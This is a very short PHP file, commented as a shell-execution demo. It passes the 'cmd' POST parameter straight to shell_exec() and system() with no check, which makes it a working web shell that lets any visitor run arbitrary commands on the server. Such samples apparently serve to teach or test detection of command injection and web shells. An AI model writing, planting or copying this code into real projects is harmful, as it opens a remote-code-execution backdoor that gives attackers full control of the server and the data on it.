<?php
// Demo file: shell execution
$cmd = $_POST['cmd'];
shell_exec($cmd);
system($cmd);
?>